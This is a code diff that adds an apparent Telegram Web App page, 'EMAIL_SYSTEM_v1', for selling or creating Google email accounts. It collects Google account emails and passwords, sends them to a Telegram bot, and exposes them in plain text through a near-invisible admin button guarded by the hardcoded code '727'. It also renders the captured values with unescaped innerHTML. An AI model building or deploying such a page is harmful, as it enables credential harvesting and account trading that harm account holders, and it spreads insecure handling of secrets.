@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Service | 727</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* ستايل خشن وداكن (Rough Dark Style) */
+        :root {
+            --bg: #050505;
+            --card: #111111;
+            --acc: #ffffff;
+            --text: #888888;
+            --input-bg: #181818;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card);
+            border: 1px solid #222;
+            padding: 25px;
+            border-radius: 2px; /* زوايا حادة لستايل خشن */
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+        }
+
+        h2 { color: #fff; text-align: center; font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 30px; border-bottom: 1px solid #222; padding-bottom: 10px; }
+
+        label { display: block; margin-bottom: 5px; font-size: 0.8rem; color: #555; }
+
+        select, input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            background: var(--input-bg);
+            border: 1px solid #222;
+            color: #fff;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        select:focus, input:focus { border-color: #444; }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: var(--acc);
+            color: #000;
+            border: none;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:active { opacity: 0.7; }
+
+        /* القسم السري */
+        .admin-section { display: none; margin-top: 20px; width: 100%; }
+        .log-item { 
+            background: #0f0f0f; 
+            padding: 10px; 
+            margin-bottom: 10px; 
+            border-left: 2px solid var(--acc); 
+            font-size: 0.8rem;
+        }
+        .old-tag { color: #ff3333; font-weight: bold; }
+        .new-tag { color: #33ff33; font-weight: bold; }
+
+        .secret-trigger {
+            margin-top: 50px;
+            background: transparent;
+            color: #111; /* شبه مخفي */
+            border: none;
+            font-size: 0.6rem;
+            cursor: default;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="userPanel">
+        <h2>EMAIL_SYSTEM_v1</h2>
+        
+        <label>SERVICE_TYPE</label>
+        <select id="type">
+            <option value="قديم">SELL OLD EMAIL (بيع)</option>
+            <option value="جديد">CREATE NEW EMAIL (جديد)</option>
+        </select>
+
+        <label>GOOGLE_ACCOUNT</label>
+        <input type="text" id="email" placeholder="user@gmail.com / ID">
+
+        <label>PASSWORD</label>
+        <input type="password" id="pass" placeholder="******">
+
+        <button onclick="processData()">SUBMIT & SAVE</button>
+
+        <!-- زر مخفي للمطور بالأسفل -->
+        <button class="secret-trigger" onclick="openAdmin()">.admin_access</button>
+    </div>
+
+    <!-- واجهة المطور السري (727) -->
+    <div class="container admin-section" id="adminPanel">
+        <h2>DATABASE_LOGS [727]</h2>
+        <div id="displayLogs"></div>
+        <button style="background: #222; color: #fff; margin-top: 10px;" onclick="closeAdmin()">EXIT_LOGS</button>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // مخزن الإيميلات داخل الجلسة الحالية للموقع
+        let sessionData = [];
+
+        function processData() {
+            const type = document.getElementById('type').value;
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if(!email || !pass) {
+                tg.showAlert("الرجاء إدخال كافة البيانات!");
+                return;
+            }
+
+            const payload = {
+                type: type,
+                email: email,
+                pass: pass,
+                time: new Date().toLocaleTimeString()
+            };
+
+            // حفظ في مصفوفة المطور
+            sessionData.push(payload);
+
+            // إرسال البيانات فوراً إلى Bot Business
+            tg.sendData(JSON.stringify(payload));
+
+            // تصفير الحقول للعملية التالية
+            document.getElementById('email').value = '';
+            document.getElementById('pass').value = '';
+            
+            tg.showScanQrPopup({ text: "تم الحفظ بنجاح! يمكنك إضافة إيميل آخر." });
+            setTimeout(() => tg.closeScanQrPopup(), 1500);
+        }
+
+        function openAdmin() {
+            let pass = prompt("ENTER SECRET CODE:");
+            if(pass === "727") {
+                document.getElementById('userPanel').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                renderLogs();
+            } else {
+                alert("ACCESS DENIED");
+            }
+        }
+
+        function renderLogs() {
+            const logArea = document.getElementById('displayLogs');
+            logArea.innerHTML = '';
+
+            // فرز: القديم أولاً ثم الجديد
+            const sorted = sessionData.sort((a, b) => a.type.localeCompare(b.type));
+
+            if(sorted.length === 0) {
+                logArea.innerHTML = "<p style='text-align:center'>No data yet.</p>";
+                return;
+            }
+
+            sorted.forEach(item => {
+                let tagClass = item.type === 'قديم' ? 'old-tag' : 'new-tag';
+                logArea.innerHTML += `
+                    <div class="log-item">
+                        <span class="${tagClass}">[${item.type}]</span><br>
+                        Email: ${item.email}<br>
+                        Pass: ${item.pass}<br>
+                        <small style="color:#444">${item.time}</small>
+                    </div>
+                `;
+            });
+        }
+
+        function closeAdmin() {
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('userPanel').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
